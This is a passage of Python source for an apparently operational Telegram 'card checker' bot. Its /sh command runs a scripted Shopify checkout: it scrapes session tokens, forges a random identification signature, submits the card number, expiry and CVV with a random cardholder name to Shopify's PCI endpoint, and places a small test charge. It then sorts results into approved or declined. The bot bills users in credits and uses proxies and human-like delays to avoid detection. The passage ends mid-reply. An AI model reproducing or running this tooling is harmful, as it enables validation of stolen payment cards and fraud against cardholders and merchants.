            # Extract web build ID
            web_build_patterns = [
                r'"sha"\s*:\s*"([^"]+)"',
                r'webBuildId["\']?\s*:\s*["\']([^"\']+)',
                r'x-checkout-web-build-id["\']?\s*:\s*["\']([^"\']+)',
                r'data-web-build-id=["\']([^"\']+)["\']',
                r'"buildId"\s*:\s*"([^"]+)"'
            ]
            
            web_build_found = False
            for idx, pattern in enumerate(web_build_patterns):
                match = re.search(pattern, html_content)
                if match:
                    self.x_checkout_web_build_id = match.group(1).strip()
                    if self.x_checkout_web_build_id:
                        self.console_logger.sub_step(6, 7, f"Pattern {idx+1} found web build ID: {self.x_checkout_web_build_id}")
                        web_build_found = True
                        break
            
            if not web_build_found:
                # Use default web build ID from logs
                self.x_checkout_web_build_id = "64794bb5d2969ba982d4eb9ee7c44ab479c9df23"
                self.console_logger.sub_step(6, 8, "Using default web build ID from logs")
            
            self.console_logger.extracted_data("Web Build ID", self.x_checkout_web_build_id)
            
            # Also update checkout token from the final URL
            if '/checkouts/cn/' in current_url:
                match = re.search(r'/checkouts/cn/([^/]+)', current_url)
                if match:
                    new_token = match.group(1)
                    if new_token != self.checkout_token:
                        self.console_logger.sub_step(6, 9, f"Updated checkout token from URL: {new_token}")
                        self.checkout_token = new_token
            
            self.console_logger.step(6, "LOAD CHECKOUT PAGE", "Checkout page loaded and tokens extracted", "SUCCESS")
            return True
                
        except Exception as e:
            self.console_logger.error_detail(f"Checkout page error: {str(e)}")
            return False
    
    async def create_payment_session(self, client, cc, mes, ano, cvv):
        """Create payment session with Shopify PCI - FIXED WITH RANDOM CARDHOLDER NAME"""
        try:
            elapsed = self.console_logger.step(7, "CREATE PAYMENT SESSION", "Creating payment session with PCI")
            
            headers = {
                'Accept': 'application/json',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'en-US,en;q=0.9',
                'Content-Type': 'application/json',
                'Origin': 'https://checkout.pci.shopifyinc.com',
                'Referer': 'https://checkout.pci.shopifyinc.com/build/682c31f/number-ltr.html',
                'Sec-CH-UA': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                'Sec-CH-UA-Mobile': '?0',
                'Sec-CH-UA-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Storage-Access': 'active',
                'User-Agent': self.user_agent,
                'Shopify-Identification-Signature': self.generate_shopify_signature()
            }
            
            # Use random name for card as per instructions - IMPORTANT: This is the cardholder name
            card_name = f"{self.random_first_name} {self.random_last_name}"
            
            json_data = {
                'credit_card': {
                    'number': cc.replace(' ', ''),
                    'month': int(mes),
                    'year': int(ano),
                    'verification_value': cvv,
                    'name': card_name,  # Cardholder name - should match billing name
                    'start_month': None,
                    'start_year': None
                },
                'payment_session_scope': 'meta-app-prod-store-1.myshopify.com'
            }
            
            async with httpx.AsyncClient(timeout=30.0) as pci_client:
                response = await pci_client.post(
                    'https://checkout.pci.shopifyinc.com/sessions',
                    headers=headers,
                    json=json_data,
                    timeout=30.0
                )
            
            self.console_logger.request_details("POST", 'https://checkout.pci.shopifyinc.com/sessions',
                                              response.status_code,
                                              time.time() - (self.console_logger.start_time + elapsed),
                                              f"Card: {cc[:6]}XXXXXX{cc[-4:]} | Cardholder: {card_name}")
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    session_id = data.get("id", "")
                    if session_id:
                        self.console_logger.extracted_data("Payment Session ID", f"{session_id[:30]}...")
                        self.console_logger.step(7, "CREATE PAYMENT SESSION", "Payment session created", "SUCCESS")
                        return True, session_id
                    else:
                        self.console_logger.error_detail("No session ID in response")
                        return False, "No payment session ID"
                except:
                    self.console_logger.error_detail("Failed to parse payment session response")
                    return False, "Payment session parse error"
            else:
                error_msg = "Payment session creation failed"
                try:
                    error_data = response.json()
                    if "error" in error_data:
                        error_msg = error_data.get("error", {}).get("message", error_msg)
                except:
                    pass
                
                error_text = response.text.lower()
                if "declined" in error_text:
                    error_msg = "Card Declined"
                elif "cvc" in error_text:
                    error_msg = "Invalid CVC"
                elif "expired" in error_text:
                    error_msg = "Expired Card"
                elif "funds" in error_text:
                    error_msg = "Insufficient Funds"
                elif "invalid" in error_text:
                    error_msg = "Invalid Card"
                elif "unprocessable" in error_text:
                    error_msg = "Card Unprocessable"
                
                self.console_logger.error_detail(f"Payment session failed: {response.status_code} - {error_msg}")
                return False, error_msg
                
        except Exception as e:
            self.console_logger.error_detail(f"Payment session error: {str(e)}")
            return False, f"Payment error: {str(e)[:80]}"
    
    async def complete_checkout_with_payment(self, client, session_id, cc, mes, ano, cvv):
        """Complete the checkout with CORRECTED STRUCTURE - FIXED delivery.noDeliveryRequired error"""
        try:
            elapsed = self.console_logger.step(8, "COMPLETE CHECKOUT", "Submitting checkout with CORRECTED structure")
            
            if not self.checkout_token or not self.x_checkout_one_session_token:
                return False, "Missing checkout tokens"
            
            # Use the checkout token from the final URL
            checkout_token_to_use = self.checkout_token
            
            url = f"{self.base_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion"
            
            headers = {
                'Accept': 'application/json',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'en-US',
                'Content-Type': 'application/json',
                'Origin': self.base_url,
                'Referer': f'{self.base_url}/checkouts/cn/{checkout_token_to_use}/en-us',
                'Sec-CH-UA': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                'Sec-CH-UA-Mobile': '?0',
                'Sec-CH-UA-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Shopify-Checkout-Client': 'checkout-web/1.0',
                'Shopify-Checkout-Source': f'id="{checkout_token_to_use}", type="cn"',
                'User-Agent': self.user_agent,
                'X-Checkout-One-Session-Token': self.x_checkout_one_session_token,
                'X-Checkout-Web-Build-Id': self.x_checkout_web_build_id,
                'X-Checkout-Web-Deploy-Stage': 'production',
                'X-Checkout-Web-Server-Handling': 'fast',
                'X-Checkout-Web-Server-Rendering': 'yes',
                'X-Checkout-Web-Source-Id': checkout_token_to_use
            }
            
            # Use the correct variant ID from product page
            variant_id = self.variant_id if self.variant_id else "43207284392098"
            
            # Use random name for billing address (matches cardholder name)
            card_name = f"{self.random_first_name} {self.random_last_name}"
            
            # Use ACTUAL product price extracted from page (dynamic: 0.55, 0.58, etc.)
            actual_price = self.product_price if self.product_price else 0.55
            price_str = f"{actual_price:.2f}"
            
            # CORRECTED payload - FIXED delivery.noDeliveryRequired structure
            json_data = {
                "operationName": "SubmitForCompletion",
                "variables": {
                    "input": {
                        "sessionInput": {
                            "sessionToken": self.x_checkout_one_session_token,
                        },
                        "discounts": {
                            "lines": [],
                            "acceptUnexpectedDiscounts": True,
                        },
                        # CORRECTED DELIVERY STRUCTURE - noDeliveryRequired as object, not boolean
                        "delivery": {
                            "deliveryLines": [],
                            "noDeliveryRequired": {
                                "noDeliveryRequired": True  # Object with boolean, not direct boolean
                            }
                        },
                        "merchandise": {
                            "merchandiseLines": [
                                {
                                    "stableId": "default",
                                    "merchandise": {
                                        "productVariantReference": {
                                            "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                                            "properties": []
                                        },
                                    },
                                    "quantity": {"items": {"value": 1}},
                                    # REQUIRED: expectedTotalPrice
                                    "expectedTotalPrice": {
                                        "value": {
                                            "amount": price_str,
                                            "currencyCode": "USD",
                                        },
                                    },
                                },
                            ],
                        },
                        "payment": {
                            "paymentLines": [
                                {
                                    "paymentMethod": {
                                        "directPaymentMethod": {
                                            "paymentMethodIdentifier": "shopify_payments",
                                            "sessionId": session_id,
                                            "billingAddress": {
                                                "streetAddress": {
                                                    "address1": self.billing_address["address1"],
                                                    "city": self.billing_address["city"],
                                                    "countryCode": self.billing_address["country"],
                                                    "postalCode": self.billing_address["zip"],
                                                    "firstName": self.billing_address["first_name"],
                                                    "lastName": self.billing_address["last_name"],
                                                    "zoneCode": self.billing_address["province"],
                                                    "phone": self.billing_address["phone"],
                                                },
                                            },
                                        },
                                    },
                                    "amount": {
                                        "value": {
                                            "amount": price_str,
                                            "currencyCode": "USD",
                                        },
                                    },
                                },
                            ],
                            # REQUIRED: totalAmount
                            "totalAmount": {
                                "value": {
                                    "amount": price_str,
                                    "currencyCode": "USD",
                                },
                            },
                        },
                        "buyerIdentity": {
                            "email": self.shipping_address["email"],
                            "phoneCountryCode": "US",
                        },
                    },
                    "attemptToken": f"{checkout_token_to_use}-{random.randint(1000, 9999)}",
                    "metafields": [],
                },
                # Use the correct persisted query ID from logs
                "id": "d32830e07b8dcb881c73c771b679bcb141b0483bd561eced170c4feecc988a59"
            }
            
            # DEBUG: Print the JSON data for troubleshooting
            self.console_logger.sub_step(8, 1, f"Submitting checkout with token: {checkout_token_to_use}")
            self.console_logger.sub_step(8, 2, f"Session token: {self.x_checkout_one_session_token[:50]}...")
            self.console_logger.sub_step(8, 3, f"Payment session: {session_id[:30]}...")
            self.console_logger.sub_step(8, 4, f"Variant ID: {variant_id}")
            self.console_logger.sub_step(8, 5, f"Email: {self.shipping_address['email']}")
            self.console_logger.sub_step(8, 6, f"Billing name: {card_name}")
            self.console_logger.sub_step(8, 7, f"Using ACTUAL dynamic price: ${actual_price:.2f}")
            self.console_logger.sub_step(8, 8, f"Address: {self.billing_address['address1']}, {self.billing_address['city']}")
            self.console_logger.sub_step(8, 9, f"Delivery: CORRECTED (noDeliveryRequired: {{'noDeliveryRequired': true}})")
            self.console_logger.sub_step(8, 10, f"Payload size: {len(json.dumps(json_data))} bytes")
            
            response = await client.post(
                url,
                headers=headers,
                json=json_data,
                cookies=self.cookies,
                timeout=30.0
            )
            
            self.console_logger.request_details("POST", url, response.status_code,
                                              time.time() - (self.console_logger.start_time + elapsed),
                                              "Complete checkout with CORRECTED structure")
            
            # DEBUG: Log response details
            self.console_logger.sub_step(8, 11, f"Response status: {response.status_code}")
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    self.console_logger.sub_step(8, 12, f"Response parsed successfully")
                    return self.parse_payment_response(data)
                except Exception as e:
                    self.console_logger.error_detail(f"Failed to parse checkout response: {str(e)}")
                    # Try to get error from response text
                    error_text = response.text[:500] if response.text else "No response text"
                    self.console_logger.sub_step(8, 13, f"Raw response: {error_text}")
                    return False, f"Checkout parse error: {error_text}"
            elif response.status_code == 400:
                # Try to get more detailed error
                try:
                    error_data = response.json()
                    self.console_logger.sub_step(8, 14, f"Error response JSON: {json.dumps(error_data)[:300]}...")
                    
                    error_msg = "Bad Request"
                    if isinstance(error_data, dict):
                        if 'errors' in error_data:
                            errors = error_data['errors']
                            if isinstance(errors, list) and len(errors) > 0:
                                if isinstance(errors[0], dict):
                                    error_msg = errors[0].get('message', str(errors[0]))
                                else:
                                    error_msg = str(errors[0])
                            elif isinstance(errors, str):
                                error_msg = errors
                        else:
                            error_msg = str(error_data)
                    elif isinstance(error_data, str):
                        error_msg = error_data
                    
                except Exception as e:
                    error_msg = response.text[:200] if response.text else "Bad Request"
                    self.console_logger.sub_step(8, 15, f"Error parsing error response: {str(e)}")
                
                self.console_logger.error_detail(f"Checkout failed: 400 - {error_msg}")
                return False, f"Checkout failed: {error_msg}"
            else:
                error_text = response.text[:500] if response.text else "No response"
                self.console_logger.sub_step(8, 16, f"Full error response: {error_text}")
                self.console_logger.error_detail(f"Checkout failed: {response.status_code} - {error_text}")
                return False, f"Checkout failed: HTTP {response.status_code}"
                
        except Exception as e:
            self.console_logger.error_detail(f"Checkout completion error: {str(e)}")
            return False, f"Checkout error: {str(e)[:80]}"
    
    def parse_payment_response(self, data):
        """Parse payment response - FIXED TO EXTRACT REAL ERROR MESSAGES"""
        try:
            if not isinstance(data, dict):
                return False, "Invalid response format"
            
            # DEBUG: Log the full response for analysis
            response_str = json.dumps(data, indent=2)
            self.console_logger.sub_step(8, 17, f"Full response: {response_str[:500]}...")
            
            # Check for GraphQL errors in the response
            if 'errors' in data:
                errors = data['errors']
                if isinstance(errors, list) and errors:
                    # Get the first error
                    error_data = errors[0]
                    if isinstance(error_data, dict):
                        error_msg = error_data.get('message', 'Payment failed')
                        
                        # Try to extract more specific error from extensions
                        extensions = error_data.get('extensions', {})
                        if 'code' in extensions:
                            error_code = extensions['code']
                            # Map Shopify error codes to human-readable messages
                            error_map = {
                                'INSUFFICIENT_FUNDS': 'Insufficient Funds',
                                'INVALID_CVC': 'Invalid CVC',
                                'EXPIRED_CARD': 'Expired Card',
                                'INCORRECT_CVC': 'Incorrect CVC',
                                'CARD_DECLINED': 'Card Declined',
                                'PROCESSING_ERROR': 'Processing Error',
                                'INCORRECT_NUMBER': 'Incorrect Card Number',
                                'INVALID_NUMBER': 'Invalid Card Number',
                                'INVALID_EXPIRY_DATE': 'Invalid Expiry Date',
                                'INCORRECT_ZIP': 'Incorrect ZIP Code',
                                'ADDRESS_VERIFICATION_FAILED': 'Address Verification Failed',
                                'CVV_FAILURE': 'CVV Verification Failed',
                                'DO_NOT_HONOR': 'Do Not Honor',
                                'PICKUP_CARD': 'Pickup Card',
                                'LOST_CARD': 'Lost Card',
                                'STOLEN_CARD': 'Stolen Card',
                                'RESTRICTED_CARD': 'Restricted Card',
                                'CALL_ISSUER': 'Call Issuer',
                                'DECLINED': 'Card Declined',
                                'GENERIC_DECLINE': 'Card Declined',
                                'HARD_DECLINE': 'Card Declined',
                                'SOFT_DECLINE': 'Card Declined',
                                'FRAUD': 'Suspected Fraud',
                                'BLACKLISTED': 'Card Blacklisted',
                                'VELOCITY_EXCEEDED': 'Transaction Limit Exceeded',
                                'THREE_D_SECURE_REQUIRED': '3D Secure Required',
                                'CAPTCHA_REQUIRED': 'CAPTCHA Required',
                                'RATE_LIMITED': 'Rate Limited',
                                'UNAUTHORIZED': 'Unauthorized Transaction',
                            }
                            if error_code in error_map:
                                error_msg = error_map[error_code]
                        
                        # Extract actual Shopify error from value field if available
                        if 'value' in extensions:
                            value_str = str(extensions['value'])
                            # Look for specific decline reasons in value
                            if 'insufficient' in value_str.lower():
                                error_msg = "Insufficient Funds"
                            elif 'cvc' in value_str.lower():
                                error_msg = "Invalid CVC"
                            elif 'expired' in value_str.lower():
                                error_msg = "Expired Card"
                            elif 'declined' in value_str.lower():
                                error_msg = "Card Declined"
                            elif 'captcha' in value_str.lower():
                                error_msg = "CAPTCHA Required"
                            elif 'address' in value_str.lower() or 'zip' in value_str.lower():
                                error_msg = "Address Verification Failed"
                        
                        # Check for CAPTCHA specifically
                        if 'captcha' in error_msg.lower() or 'robot' in error_msg.lower() or 'human' in error_msg.lower():
                            return False, "CAPTCHA_REQUIRED - Please try again"
                        
                        return False, error_msg
                    else:
                        return False, str(error_data)
                elif isinstance(errors, str):
                    error_msg = errors
                    if 'captcha' in error_msg.lower():
                        return False, "CAPTCHA_REQUIRED - Please try again"
                    return False, error_msg
                else:
                    error_msg = str(errors)
                    if 'captcha' in error_msg.lower():
                        return False, "CAPTCHA_REQUIRED - Please try again"
                    return False, error_msg
            
            # Check for success in data
            if 'data' not in data:
                return False, "No data in response"
            
            submit_data = data.get('data', {}).get('submitForCompletion', {})
            typename = submit_data.get('__typename', '')
            
            if typename == 'SubmitSuccess':
                receipt = submit_data.get('receipt', {})
                receipt_id = receipt.get('id', '')
                if receipt_id:
                    return True, f"ORDER_PLACED - Payment Successful (Receipt: {receipt_id})"
                else:
                    return True, "ORDER_PLACED - Payment Successful"
            elif typename == 'SubmitAlreadyAccepted':
                return True, "ORDER_ALREADY_ACCEPTED - Payment Successful"
            elif typename == 'SubmitFailed':
                reason = submit_data.get('reason', 'Payment failed')
                # Parse reason for better error messages
                reason_lower = reason.lower()
                
                # Map Shopify decline reasons
                if 'insufficient' in reason_lower or 'funds' in reason_lower:
                    return False, "Insufficient Funds"
                elif 'cvc' in reason_lower or 'security' in reason_lower:
                    return False, "Invalid CVC"
                elif 'expired' in reason_lower:
                    return False, "Expired Card"
                elif 'declined' in reason_lower:
                    return False, "Card Declined"
                elif 'invalid' in reason_lower and 'card' in reason_lower:
                    return False, "Invalid Card"
                elif 'address' in reason_lower or 'zip' in reason_lower or 'avs' in reason_lower:
                    return False, "Address Verification Failed"
                elif 'captcha' in reason_lower or 'robot' in reason_lower:
                    return False, "CAPTCHA_REQUIRED - Please try again"
                elif '3d' in reason_lower or 'secure' in reason_lower:
                    return True, "3D Secure Required - Card Approved"
                elif 'fraud' in reason_lower:
                    return False, "Suspected Fraud"
                elif 'stolen' in reason_lower:
                    return False, "Card Reported Stolen"
                elif 'lost' in reason_lower:
                    return False, "Card Reported Lost"
                elif 'pickup' in reason_lower:
                    return False, "Card Pickup Required"
                elif 'restricted' in reason_lower:
                    return False, "Restricted Card"
                elif 'do not honor' in reason_lower:
                    return False, "Do Not Honor"
                elif 'call issuer' in reason_lower:
                    return False, "Call Issuer"
                else:
                    # Return the actual reason from Shopify
                    return False, f"Declined: {reason}"
            elif typename == 'SubmitRejected':
                errors = submit_data.get('errors', [])
                if errors and isinstance(errors, list) and len(errors) > 0:
                    error_data = errors[0]
                    error_msg = error_data.get('localizedMessage', 'Payment rejected')
                    error_code = error_data.get('code', '')
                    
                    # Map error codes
                    if error_code == 'INVALID_CVC':
                        return False, "Invalid CVC"
                    elif error_code == 'INSUFFICIENT_FUNDS':
                        return False, "Insufficient Funds"
                    elif error_code == 'EXPIRED_CARD':
                        return False, "Expired Card"
                    elif error_code == 'CARD_DECLINED':
                        return False, "Card Declined"
                    elif error_code == 'CAPTCHA_REQUIRED':
                        return False, "CAPTCHA_REQUIRED - Please try again"
                    elif error_code == 'ADDRESS_VERIFICATION_FAILED':
                        return False, "Address Verification Failed"
                    
                    error_msg_lower = error_msg.lower()
                    if 'captcha' in error_msg_lower:
                        return False, "CAPTCHA_REQUIRED - Please try again"
                    elif 'declined' in error_msg_lower:
                        return False, "Card Declined"
                    elif 'cvc' in error_msg_lower:
                        return False, "Invalid CVC"
                    elif 'address' in error_msg_lower or 'zip' in error_msg_lower:
                        return False, "Address verification failed"
                    else:
                        return False, error_msg
                else:
                    return False, "Payment rejected"
            elif typename == 'Throttled':
                # Rate limited or throttled
                poll_after = submit_data.get('pollAfter', 0)
                if poll_after > 0:
                    return False, f"Rate Limited - Try again in {poll_after}s"
                else:
                    return False, "Rate Limited - Please try again"
            
            # If we get here, check for any clues in the response
            response_text = json.dumps(data).lower()
            
            # Check for specific patterns
            if any(pattern in response_text for pattern in ['captcha', 'robot', 'human verification']):
                return False, "CAPTCHA_REQUIRED - Please try again"
            if 'insufficient' in response_text:
                return False, "Insufficient Funds"
            if 'cvc' in response_text or 'security code' in response_text:
                return False, "Invalid CVC"
            if 'expired' in response_text:
                return False, "Expired Card"
            if 'declined' in response_text:
                return False, "Card Declined"
            if '3d' in response_text or 'secure' in response_text:
                return True, "3D Secure Required - Card Approved"
            if 'fraud' in response_text:
                return False, "Suspected Fraud"
            if 'address' in response_text or 'zip' in response_text or 'avs' in response_text:
                return False, "Address Verification Failed"
            if 'stolen' in response_text:
                return False, "Card Reported Stolen"
            if 'lost' in response_text:
                return False, "Card Reported Lost"
            if 'pickup' in response_text:
                return False, "Card Pickup Required"
            if 'restricted' in response_text:
                return False, "Restricted Card"
            if 'do not honor' in response_text:
                return False, "Do Not Honor"
            if 'call issuer' in response_text:
                return False, "Call Issuer"
            
            # Default to declined with actual response for debugging
            return False, f"Payment declined: {str(data)[:100]}..."
            
        except Exception as e:
            # Log the actual error for debugging
            self.console_logger.error_detail(f"Parse error: {str(e)}")
            self.console_logger.sub_step(8, 18, f"Raw data that failed to parse: {str(data)[:200]}...")
            return False, f"Response parse error: {str(e)[:50]}"
    
    def generate_shopify_signature(self):
        """Generate Shopify identification signature"""
        # Generate a random JWT-like signature
        header = "eyJraWQiOiJ2MSIsImFsZyI6IkhTMjU2In0"
        payload = f"eyJjbGllbnRfaWQiOiIyIiwiY2xpZW50X2FjY291bnRfaWQiOiI2MDc1NzgwMzE3MCIsInVuaXF1ZV9pZCI6IjhkYWY1NWNmODFiMGEzZTgxMTA4MjdhNTY3ZDg4MGUzIiwiaWF0IjoxNzY5Njc2Njk2fQ"
        signature = ''.join(random.choices(string.ascii_letters + string.digits, k=43))
        return f"{header}.{payload}.{signature}"
    
    async def check_card(self, card_details, username, user_data):
        """Main card checking method - SINGLE SUBMISSION FLOW WITH PICKUP"""
        start_time = time.time()
        
        # Initialize console logger for this check
        self.console_logger = ConsoleLogger(self.user_id)
        self.console_logger.start_check(card_details)
        
        try:
            # Parse card details
            cc_parts = card_details.split('|')
            if len(cc_parts) < 4:
                elapsed_time = time.time() - start_time
                self.console_logger.result(False, "Invalid card format", "ERROR", elapsed_time)
                return format_shopify_response("", "", "", "", "Invalid card format. Use: CC|MM|YY|CVV", elapsed_time, username, user_data)

            cc = cc_parts[0].strip().replace(" ", "")
            mes = cc_parts[1].strip()
            ano = cc_parts[2].strip()
            cvv = cc_parts[3].strip()

            # Validate card details
            if not cc.isdigit() or len(cc) < 15:
                elapsed_time = time.time() - start_time
                self.console_logger.result(False, "Invalid card number", "ERROR", elapsed_time)
                return format_shopify_response(cc, mes, ano, cvv, "Invalid card number", elapsed_time, username, user_data)

            if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
                elapsed_time = time.time() - start_time
                self.console_logger.result(False, "Invalid month", "ERROR", elapsed_time)
                return format_shopify_response(cc, mes, ano, cvv, "Invalid month", elapsed_time, username, user_data)

            if not ano.isdigit() or len(ano) not in [2, 4]:
                elapsed_time = time.time() - start_time
                self.console_logger.result(False, "Invalid year", "ERROR", elapsed_time)
                return format_shopify_response(cc, mes, ano, cvv, "Invalid year", elapsed_time, username, user_data)

            if not cvv.isdigit() or len(cvv) not in [3, 4]:
                elapsed_time = time.time() - start_time
                self.console_logger.result(False, "Invalid CVV", "ERROR", elapsed_time)
                return format_shopify_response(cc, mes, ano, cvv, "Invalid CVV", elapsed_time, username, user_data)

            if len(ano) == 2:
                ano = '20' + ano

            # Log card validation success
            self.console_logger.sub_step(0, 1, f"Card validated: {cc[:6]}XXXXXX{cc[-4:]}")
            self.console_logger.sub_step(0, 2, f"Expiry: {mes}/{ano[-2:]} | CVV: {cvv}")
            self.console_logger.sub_step(0, 3, f"Cardholder name: {self.random_first_name} {self.random_last_name}")

            # Create HTTP client
            client_params = {
                'timeout': 30.0,
                'follow_redirects': False,
                'http2': True
            }
            
            # Add proxy if available
            if self.current_proxy:
                client_params['proxy'] = self.current_proxy
                self.console_logger.sub_step(0, 4, f"Proxy enabled: {self.current_proxy[:50]}...")

            async with httpx.AsyncClient(**client_params) as client:
                # Step 1: Load homepage
                if not await self.load_homepage(client):
                    elapsed_time = time.time() - start_time
                    self.console_logger.result(False, "Failed to load homepage", "ERROR", elapsed_time)
                    return format_shopify_response(cc, mes, ano, cvv, "Failed to initialize", elapsed_time, username, user_data)
                await self.human_delay(1, 2)
                
                # Step 2: Load product page and extract dynamic data INCLUDING PRICE
                if not await self.load_product_page(client):
                    elapsed_time = time.time() - start_time
                    self.console_logger.result(False, "Failed to load product", "ERROR", elapsed_time)
                    return format_shopify_response(cc, mes, ano, cvv, "Product not available", elapsed_time, username, user_data)
                await self.human_delay(1, 2)
                
                # Step 3: Add to cart
                if not await self.add_to_cart(client):
                    elapsed_time = time.time() - start_time
                    self.console_logger.result(False, "Failed to add to cart", "ERROR", elapsed_time)
                    return format_shopify_response(cc, mes, ano, cvv, "Cart error", elapsed_time, username, user_data)
                await self.human_delay(1, 2)
                
                # Step 4: Go to cart page
                if not await self.go_to_cart_page(client):
                    elapsed_time = time.time() - start_time
                    self.console_logger.result(False, "Failed to load cart", "ERROR", elapsed_time)
                    return format_shopify_response(cc, mes, ano, cvv, "Cart page error", elapsed_time, username, user_data)
                await self.human_delay(1, 2)
                
                # Step 5: Go to checkout
                success, checkout_result = await self.go_to_checkout(client)
                if not success:
                    elapsed_time = time.time() - start_time
                    self.console_logger.result(False, checkout_result, "ERROR", elapsed_time)
                    return format_shopify_response(cc, mes, ano, cvv, checkout_result, elapsed_time, username, user_data)
                checkout_url = checkout_result
                await self.human_delay(1, 2)
                
                # Step 6: Load checkout page for tokens WITH REDIRECT HANDLING - FIXED
                if not await self.load_checkout_page_with_redirects(client, checkout_url):
                    elapsed_time = time.time() - start_time
                    self.console_logger.result(False, "Failed to load checkout page", "ERROR", elapsed_time)
                    return format_shopify_response(cc, mes, ano, cvv, "Checkout page error", elapsed_time, username, user_data)
                await self.human_delay(1, 2)
                
                # Step 7: Create payment session
                success, session_result = await self.create_payment_session(client, cc, mes, ano, cvv)
                if not success:
                    elapsed_time = time.time() - start_time
                    self.console_logger.result(False, session_result, "DECLINED", elapsed_time)
                    return format_shopify_response(cc, mes, ano, cvv, session_result, elapsed_time, username, user_data)
                session_id = session_result
                await self.human_delay(1, 2)
                
                # Step 8: Complete checkout with CORRECTED structure
                success, checkout_result = await self.complete_checkout_with_payment(client, session_id, cc, mes, ano, cvv)
                
                elapsed_time = time.time() - start_time
                
                # Log final result
                if success:
                    self.console_logger.result(True, checkout_result, "APPROVED", elapsed_time)
                else:
                    self.console_logger.result(False, checkout_result, "DECLINED", elapsed_time)
                
                return format_shopify_response(cc, mes, ano, cvv, checkout_result, elapsed_time, username, user_data)

        except httpx.TimeoutException:
            elapsed_time = time.time() - start_time
            self.console_logger.result(False, "Request timeout", "TIMEOUT", elapsed_time)
            return format_shopify_response(cc, mes, ano, cvv, "TIMEOUT_ERROR: Request timeout", elapsed_time, username, user_data)
        except httpx.ConnectError:
            elapsed_time = time.time() - start_time
            self.console_logger.result(False, "Connection error", "CONNECTION_ERROR", elapsed_time)
            return format_shopify_response(cc, mes, ano, cvv, "CONNECTION_ERROR: Connection failed", elapsed_time, username, user_data)
        except Exception as e:
            elapsed_time = time.time() - start_time
            self.console_logger.result(False, str(e), "UNKNOWN_ERROR", elapsed_time)
            return format_shopify_response(cc, mes, ano, cvv, f"UNKNOWN_ERROR: {str(e)[:80]}", elapsed_time, username, user_data)

# Command handler
@Client.on_message(filters.command(["sh", ".sh", "$sh"]))
@auth_and_free_restricted
async def handle_shopify_charge(client: Client, message: Message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or str(user_id)

        # CHECK: First check if command is disabled
        command_text = message.text.split()[0]
        command_name = command_text.lstrip('/.$')

        if is_command_disabled(command_name):
            await message.reply(get_command_offline_message(command_text))
            return

        # Check if user is banned
        if is_user_banned(user_id):
            await message.reply("""<pre>⚠️ User Banned</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: You have been banned from using this bot.
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        # Load user data
        users = load_users()
        user_id_str = str(user_id)
        if user_id_str not in users:
            await message.reply("""<pre>📝 Registration Required</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: You need to register first with /register
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        user_data = users[user_id_str]
        user_plan = user_data.get("plan", {})
        plan_name = user_plan.get("plan", "Free")

        # Check cooldown (owner is automatically skipped in check_cooldown function)
        can_use, wait_time = check_cooldown(user_id, "sh")
        if not can_use:
            await message.reply(f"""<pre>⏱️ Cooldown Active</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Please wait {wait_time:.1f} seconds before using this command again.
🠪 <b>Your Plan:</b> <code>{plan_name}</code>
🠪 <b>Anti-Spam:</b> <code>{user_plan.get('antispam', 15)}s</code>
━━━━━━━━━━━━━""")
            return

        args = message.text.split()
        if len(args) < 2:
            if CHARGE_PROCESSOR_AVAILABLE and charge_processor:
                try:
                    usage_msg = charge_processor.get_usage_message(
                        "sh", 
                        "Shopify Charge",
                        "4111111111111111|12|2025|123"
                    )
                    await message.reply(usage_msg)
                except:
                    await message.reply("""<pre>#WAYNE ━[SHOPIFY CHARGE]━━</pre>
━━━━━━━━━━━━━
🠪 <b>Command</b>: <code>/sh</code> or <code>.sh</code> or <code>$sh</code>
🠪 <b>Usage</b>: <code>/sh cc|mm|yy|cvv</code>
🠪 <b>Example</b>: <code>/sh 4111111111111111|12|2025|123</code>
━━━━━━━━━━━━━
<b>~ Note:</b> <code>Charges via Shopify gateway (Deducts 2 credits AFTER check completes)</code>
<b>~ Note:</b> <code>Free users can use in authorized groups with credit deduction</code>""")
            else:
                await message.reply("""<pre>#WAYNE ━[SHOPIFY CHARGE]━━</pre>
━━━━━━━━━━━━━
🠪 <b>Command</b>: <code>/sh</code> or <code>.sh</code> or <code>$sh</code>
🠪 <b>Usage</b>: <code>/sh cc|mm|yy|cvv</code>
🠪 <b>Example</b>: <code>/sh 4111111111111111|12|2025|123</code>
━━━━━━━━━━━━━
<b>~ Note:</b> <code>Charges via Shopify gateway (Deducts 2 credits AFTER check completes)</code>
<b>~ Note:</b> <code>Free users can use in authorized groups with credit deduction</code>""")
            return

        card_details = args[1].strip()

        cc_parts = card_details.split('|')
        if len(cc_parts) < 4:
            await message.reply("""<pre>❌ Invalid Format</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Invalid card format.
🠪 <b>Correct Format</b>: <code>cc|mm|yy|cvv</code>
🠪 <b>Example</b>: <code>4111111111111111|12|2025|123</code>
━━━━━━━━━━━━━""")
            return

        cc = cc_parts[0]
        mes = cc_parts[1]
        ano = cc_parts[2]
        cvv = cc_parts[3]

        # Show processing message - ALWAYS SHOW 0.55$ IN UI
        processing_msg = await message.reply(
            f"""
<b>[Shopify Charge 0.55$] | #WAYNE</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{cc}|{mes}|{ano}|{cvv}</code>
